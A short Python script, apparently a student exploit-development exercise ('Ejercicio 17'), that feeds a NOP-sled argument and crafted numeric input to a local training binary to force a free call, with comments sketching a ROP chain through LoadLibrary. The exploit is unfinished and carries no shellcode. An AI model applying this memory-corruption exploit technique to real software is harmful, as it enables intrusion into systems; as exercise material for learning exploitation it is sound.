#Ejercicio 17 by hdbreaker
import struct
from subprocess import Popen, PIPE

#rop
#101031EC => rdata libraryName
#LoadLibrary 
#pop 
#call

argv1  = "\x90" * 0x1000

bin = "Ejercicio17.exe "+argv1
stdin = Popen(bin, stdin=PIPE)

numOne = "4501" #Force to call free
numTwo = "2\n" #0x00338F78

payload = numOne +" "+numTwo
raw_input("frula")
stdin.communicate(payload)

